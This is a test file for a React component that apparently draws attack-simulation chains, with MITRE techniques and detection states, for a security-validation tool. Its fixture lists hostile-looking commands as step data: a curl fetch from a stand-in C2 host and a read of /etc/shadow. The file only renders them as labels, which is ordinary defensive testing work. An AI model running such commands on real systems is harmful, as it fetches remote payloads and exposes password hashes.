/**
 * ChainStage — one stage, three modes (design v26 §4.1, §4.4, §4.6, §6, §7).
 *
 * The chain a DC builds in the Composer, previews on a scenario's sheet and
 * watches on Run detail is ONE drawing: lanes are signal paths
 * (`composerLanes`), cards sit in execution order, edges are the declared
 * causality (`composerGraph`). These tests pin what each mode does with it:
 *
 *   preview   read-only, no state, scaled to fit but never below 0.62
 *   live      every card says its state as a pip AND a word
 *   editable  cards are buttons that select; tenant rules sit in the Engine band
 *
 * and the two honesty rules: a scenario with no steps shows the stage's empty
 * state (never a synthetic chain), and steps with no declared causality are
 * NOT joined to each other — order is drawn by column, not by invented edges.
 */
import React from 'react'
import { describe, it, expect, vi, afterEach } from 'vitest'
import { render, screen, within, fireEvent } from '@testing-library/react'
import ChainStage from '../ChainStage.jsx'
import { buildChainStage, fitScale, MIN_STAGE_SCALE, LIVE_STATES } from '../chainStage.js'

void React

const step = (id, over = {}) => ({
  id,
  name: `Step ${id}`,
  command: 'id',
  identity: 'www-data',
  technique: 'T1059',
  causalityParent: null,
  causalityPivot: null,
  detections: [{ plane: 'EDR', type: 'BIOC' }],
  ...over,
})

// A chain that crosses two signal paths with a declared spine:
// step-01 runs on the host, step-02 calls AWS, step-03 runs on the host again.
const SPINE = [
  step('step-01', { command: 'curl -s http://c2.lab.test/x' }),
  step('step-02', { command: 'aws s3 ls', causalityParent: 'step-01', causalityPivot: 'process_lineage' }),
  step('step-03', { command: 'cat /etc/shadow', causalityParent: 'step-02', causalityPivot: 'shared_entity' }),
]

const bandOf = (container, key) => container.querySelector(`.chain-stage__lane[data-lane="${key}"]`)

describe('ChainStage — preview (the scenario sheet)', () => {
  it('draws each real step in the lane its command names, in execution order', () => {
    const { container } = render(<ChainStage mode="preview" steps={SPINE} />)
    const cards = screen.getAllByTestId(/^stage-card-step-/)
    expect(cards.map((c) => c.getAttribute('data-step-id'))).toEqual(['step-01', 'step-02', 'step-03'])
    expect(screen.getByTestId('stage-card-step-01')).toHaveAttribute('data-lane', 'ENDPOINT')
    expect(screen.getByTestId('stage-card-step-02')).toHaveAttribute('data-lane', 'CLOUD')
    expect(screen.getByTestId('stage-card-step-03')).toHaveAttribute('data-lane', 'ENDPOINT')
    // Each card's top sits inside its band, and later steps sit further right.
    for (const id of ['step-01', 'step-02', 'step-03']) {
      const card = screen.getByTestId(`stage-card-${id}`)
      const band = bandOf(container, card.getAttribute('data-lane'))
      const top = parseFloat(card.style.top)
      expect(top).toBeGreaterThanOrEqual(parseFloat(band.style.top))
      expect(top).toBeLessThan(parseFloat(band.style.top) + parseFloat(band.style.height))
    }
    const left = (id) => parseFloat(screen.getByTestId(`stage-card-${id}`).style.left)
    expect(left('step-02')).toBeGreaterThan(left('step-01'))
    expect(left('step-03')).toBeGreaterThan(left('step-02'))
  })

  it('compact: draws LAUNCH, the lanes the chain uses, and PROOF — not every lane', () => {
    const { container } = render(<ChainStage mode="preview" steps={SPINE} />)
    const keys = [...container.querySelectorAll('.chain-stage__lane')].map((b) => b.getAttribute('data-lane'))
    expect(keys).toEqual(['LAUNCH', 'ENDPOINT', 'CLOUD', 'PROOF'])
  })

  it('draws the declared causality, the trigger into the root and the leaf into the proof', () => {
    const { container } = render(<ChainStage mode="preview" steps={SPINE} cgo="apache2 / www-data" />)
    const edges = [...container.querySelectorAll('[data-edge]')].map((e) => e.getAttribute('data-edge'))
    expect(edges).toEqual(expect.arrayContaining([
      'trigger->step-01', 'step-01->step-02', 'step-02->step-03', 'step-03->proof',
    ]))
    expect(edges).toHaveLength(4)
    // A typed pivot reads as dashed, the process spine as solid.
    const typed = container.querySelector('[data-edge="step-02->step-03"]')
    expect(typed).toHaveAttribute('stroke-dasharray')
    expect(container.querySelector('[data-edge="step-01->step-02"]')).not.toHaveAttribute('stroke-dasharray')
    expect(screen.getByTestId('stage-card-trigger')).toHaveTextContent('apache2 / www-data')
  })

  it('never invents a sequence: steps with no declared parent are not joined to each other', () => {
    const star = [step('step-01'), step('step-02'), step('step-03')]
    const { container } = render(<ChainStage mode="preview" steps={star} />)
    const edges = [...container.querySelectorAll('[data-edge]')].map((e) => e.getAttribute('data-edge'))
    expect(edges.filter((e) => /^step-\d+->step-/.test(e))).toEqual([])
    // Each step hangs off the trigger and runs into the proof on its own.
    expect(edges).toEqual(expect.arrayContaining(['trigger->step-01', 'trigger->step-02', 'trigger->step-03']))
    expect(screen.getByTestId('chain-stage-summary')).toHaveTextContent(/no declared spine/i)
  })

  it('a scenario with no steps shows the stage\'s empty state, never a synthetic chain', () => {
    const { container } = render(<ChainStage mode="preview" steps={[]} />)
    expect(screen.getByTestId('chain-stage-empty')).toHaveTextContent(/no authored chain/i)
    expect(screen.queryAllByTestId(/^stage-card-/)).toHaveLength(0)
    expect(container.querySelectorAll('.chain-stage__lane')).toHaveLength(0)
  })

  it('has no state and no controls: cards are not buttons and carry no state word', () => {
    render(<ChainStage mode="preview" steps={SPINE} states={{ 'step-01': 'detected' }} />)
    expect(screen.queryAllByRole('button')).toHaveLength(0)
    expect(screen.queryByText('Detected')).toBeNull()
    expect(screen.queryByRole('img', { name: 'Detected' })).toBeNull()
  })

  describe('scale', () => {
    afterEach(() => { delete HTMLElement.prototype.clientWidth })

    it('fits the stage to its box, and never below 0.62', () => {
      const w = buildChainStage(SPINE, { compact: true }).width
      expect(MIN_STAGE_SCALE).toBe(0.62)
      expect(fitScale(w * 2, w)).toBe(1)
      expect(fitScale(w * 0.8, w)).toBeCloseTo(0.8, 2)
      expect(fitScale(w * 0.3, w)).toBe(0.62)
      expect(fitScale(0, w)).toBe(0.62)
    })

    it('scrolls inside its own box at 0.62 when the box is narrower than that', () => {
      Object.defineProperty(HTMLElement.prototype, 'clientWidth', { configurable: true, get: () => 200 })
      render(<ChainStage mode="preview" steps={SPINE} />)
      const stage = screen.getByTestId('chain-stage')
      expect(stage).toHaveAttribute('data-scale', '0.62')
      const scroll = stage.querySelector('.chain-stage__scroll')
      const sized = scroll.firstElementChild
      // The scrolled box is the scaled stage's size, so the overflow scrolls.
      const { width } = buildChainStage(SPINE, { compact: true })
      expect(parseFloat(sized.style.width)).toBeCloseTo(width * 0.62, 0)
    })
  })
})

describe('ChainStage — live (Run detail)', () => {
  const states = {
    'step-01': 'detected',
    'step-02': 'broken',
    'step-03': 'ran',
  }

  it('says every card\'s state as a pip and a word', () => {
    render(<ChainStage mode="live" steps={SPINE} states={states} />)
    const card = (id) => screen.getByTestId(`stage-card-${id}`)
    expect(within(card('step-01')).getByRole('img', { name: 'Detected' })).toBeInTheDocument()
    expect(card('step-01')).toHaveTextContent('Detected')
    expect(within(card('step-02')).getByRole('img', { name: 'Broken' })).toBeInTheDocument()
    expect(within(card('step-03')).getByRole('img', { name: 'Ran — not read back' })).toBeInTheDocument()
    expect(card('step-02')).toHaveAttribute('data-state', 'broken')
  })

  it('has a word for each of the six states', () => {
    expect(Object.fromEntries(Object.entries(LIVE_STATES).map(([k, v]) => [k, v.word]))).toEqual({
      detected: 'Detected',
      broken: 'Broken',
      waiting: 'Waiting',
      not_seen: 'Not seen',
      ran: 'Ran — not read back',
      did_not_run: 'Did not run',
    })
    const all = SPINE.concat([step('step-04'), step('step-05'), step('step-06')])
    render(<ChainStage mode="live" steps={all} states={{
      'step-01': 'detected', 'step-02': 'broken', 'step-03': 'waiting',
      'step-04': 'not_seen', 'step-05': 'ran', 'step-06': 'did_not_run',
    }} />)
    for (const word of ['Detected', 'Broken', 'Waiting', 'Not seen', 'Ran — not read back', 'Did not run']) {
      expect(screen.getByRole('img', { name: word })).toBeInTheDocument()
    }
  })

  it('a step the run has not reported reads Waiting, never Detected', () => {
    render(<ChainStage mode="live" steps={SPINE} states={{ 'step-01': 'detected' }} />)
    expect(within(screen.getByTestId('stage-card-step-02')).getByRole('img', { name: 'Waiting' })).toBeInTheDocument()
  })

  it('counts the states in a legend', () => {
    render(<ChainStage mode="live" steps={SPINE} states={states} />)
    const legend = screen.getByTestId('chain-stage-legend')
    expect(legend).toHaveTextContent('1 detected')
    expect(legend).toHaveTextContent('1 broken')
    expect(legend).toHaveTextContent('1 ran — not read back')
  })

  it('a card opens the step (a Broken step opens its troubleshooting) and a lane header opens its component', () => {
    const onSelect = vi.fn()
    const onOpenLane = vi.fn()
    render(<ChainStage mode="live" steps={SPINE} states={states} onSelect={onSelect} onOpenLane={onOpenLane} />)
    fireEvent.click(screen.getByRole('button', { name: /step-02.*broken/i }))
    expect(onSelect).toHaveBeenCalledWith('step-02')
    fireEvent.click(screen.getByRole('button', { name: /open the component behind cloud control plane/i }))
    expect(onOpenLane).toHaveBeenCalledWith('CLOUD')
  })
})

describe('ChainStage — editable (the Composer)', () => {
  it('draws all eight bands, and a card is a button that selects its step', () => {
    const onSelect = vi.fn()
    const { container } = render(
      <ChainStage mode="editable" steps={SPINE} selectedId="step-02" onSelect={onSelect} />,
    )
    const keys = [...container.querySelectorAll('.chain-stage__lane')].map((b) => b.getAttribute('data-lane'))
    expect(keys).toEqual(['LAUNCH', 'ENDPOINT', 'COLLECTOR', 'WIRE', 'CLOUD', 'NONE', 'ENG', 'PROOF'])
    const two = screen.getByRole('button', { name: /step-02/ })
    expect(two).toHaveAttribute('aria-pressed', 'true')
    expect(screen.getByRole('button', { name: /step-01/ })).toHaveAttribute('aria-pressed', 'false')
    fireEvent.click(screen.getByRole('button', { name: /step-03/ }))
    expect(onSelect).toHaveBeenCalledWith('step-03')
  })

  it('wears each step\'s door badge, read from what it does', () => {
    render(<ChainStage mode="editable" steps={SPINE} />)
    expect(screen.getByTestId('chain-door-step-01')).toHaveTextContent(/^AGT$/)
    expect(screen.getByTestId('chain-door-step-02')).toHaveTextContent('AGT → CLOUD')
  })

  it('holds tenant rules in the Cortex Engine band, never a step there', () => {
    const onSelectRule = vi.fn()
    render(
      <ChainStage
        mode="editable"
        steps={SPINE}
        rules={[{ key: 'rule:CR-1', label: 'CR-1', sub: 'stub · not deployable' }]}
        onSelectRule={onSelectRule}
      />,
    )
    const rule = screen.getByTestId('stage-rule-rule:CR-1')
    expect(rule).toHaveAttribute('data-lane', 'ENG')
    expect(screen.getAllByTestId(/^stage-card-step-/).every((c) => c.getAttribute('data-lane') !== 'ENG')).toBe(true)
    fireEvent.click(within(rule).getByRole('button'))
    expect(onSelectRule).toHaveBeenCalledWith('rule:CR-1')
  })

  it('zooms, but never below 0.62', () => {
    const { rerender } = render(<ChainStage mode="editable" steps={SPINE} zoom={1.2} />)
    expect(screen.getByTestId('chain-stage')).toHaveAttribute('data-scale', '1.2')
    rerender(<ChainStage mode="editable" steps={SPINE} zoom={0.4} />)
    expect(screen.getByTestId('chain-stage')).toHaveAttribute('data-scale', '0.62')
  })
})
